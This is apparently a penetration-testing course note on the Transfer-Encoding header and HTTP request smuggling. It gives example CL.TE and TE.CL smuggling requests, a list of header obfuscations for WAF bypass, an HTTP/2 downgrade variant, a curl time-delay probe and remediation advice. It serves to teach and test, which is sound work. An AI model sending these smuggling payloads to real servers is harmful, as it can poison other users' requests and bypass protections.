---
tags: [vapt, http-headers, web, advanced]
difficulty: advanced
module: "03 - HTTP Headers"
topic: "03.20 Transfer-Encoding — HTTP Request Smuggling"
portswigger_labs: ["HTTP request smuggling — 22 labs"]
---

# 03.20 — Transfer-Encoding

## What is it?

`Transfer-Encoding` specifies how the message body is encoded for transport. The most common value is `chunked`, which lets the sender send the body in chunks without knowing total size upfront. The conflict between `Transfer-Encoding: chunked` and `Content-Length` is the root cause of HTTP request smuggling.

---

## Chunked Encoding Format

```
Transfer-Encoding: chunked

BODY FORMAT:
  <chunk-size-in-hex>\r\n
  <chunk-data>\r\n
  ...repeat...
  0\r\n     ← terminator
  \r\n

EXAMPLE:
  7\r\n
  Mozilla\r\n
  9\r\n
  Developer\r\n
  0\r\n
  \r\n
  
  Decoded body: "MozillaDeveloper"
```

---

## Attack: HTTP Request Smuggling

```
SCENARIO: Frontend proxy uses Content-Length, backend uses Transfer-Encoding.

CL.TE SMUGGLING (Content-Length to Transfer-Encoding):
  Frontend counts body by Content-Length → passes full body to backend
  Backend reads chunked → stops at "0" → leftover bytes poison next request!

POST / HTTP/1.1
Host: target.com
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED

WHAT HAPPENS:
  Frontend: sees Content-Length=13 → forwards 13 bytes (0\r\n\r\nSMUGGLED)
  Backend: reads chunked → first chunk = 0 (done!) → "SMUGGLED" stays in buffer
  → Prepended to NEXT victim's request!

TE.CL SMUGGLING (Transfer-Encoding to Content-Length):
  Frontend uses Transfer-Encoding → backend uses Content-Length!
  
POST / HTTP/1.1
Transfer-Encoding: chunked
Content-Length: 3

8\r\n
SMUGGLED\r\n
0\r\n
\r\n
  
  Frontend: reads chunked → full body
  Backend: Content-Length=3 → reads only "8\r\n" → rest in buffer → poisons next request!
```

**PortSwigger Labs:** HTTP request smuggling (22 labs)

---

## TE Obfuscation (WAF Bypass)

```
To confuse which server processes TE:

Transfer-Encoding: xchunked      ← nonstandard spelling
Transfer-Encoding: chunked       ← trailing space
Transfer-Encoding: chunked       ← tab instead of space
Transfer-Encoding:
 chunked                         ← obfuscated with newline + space
Transfer-Encoding[0x0b]: chunked ← vertical tab as separator
X-Transfer-Encoding: chunked     ← nonstandard header name (some backends)
```

---

## H2 Smuggling via TE

```
HTTP/2 doesn't use Transfer-Encoding (framing is at protocol level).
BUT: H2-to-H1 downgrade proxies convert H2 requests to H1.

If frontend is H2, backend is H1:
  Inject TE: chunked into H2 request
  Frontend ignores it (H2 doesn't use TE)
  But includes it as a header when downgrading to H1
  Backend processes it as chunked!
  → H2.TE smuggling!
```

---

## Testing

```bash
# Test for CL.TE smuggling (time delay method):
curl -X POST https://target.com/ \
  -H "Transfer-Encoding: chunked" \
  -H "Content-Length: 4" \
  -d $'1\r\nZ\r\nQ' \
  --http1.1

# If response is delayed → TE.CL vulnerability!

# Burp Suite HTTP Request Smuggler extension:
# Automatically tests all smuggling variants
# Scanner → right-click request → Extensions → HTTP Request Smuggler

# Manual in Burp Repeater:
# IMPORTANT: Disable "Update Content-Length" in Repeater settings
# Use \r\n literally (turn off automatic encoding)
```

---

## How to Fix / Secure

| Risk | Fix |
|------|-----|
| CL.TE / TE.CL desync | Front-end and back-end must use same interpretation |
| TE obfuscation accepted | Strictly validate Transfer-Encoding values |
| H2-to-H1 downgrade smuggling | Ensure backend validates headers when receiving from proxy |

---

## Related Notes
- [[21 - Content-Length]] — the sibling header causing desync
- [[30 - TE chunked]] — HTTP/2 TE smuggling variant
- [[02.15 - Transfer-Encoding]] — TE deep dive
- [[Module 10 - HTTP Request Smuggling]] — full smuggling module
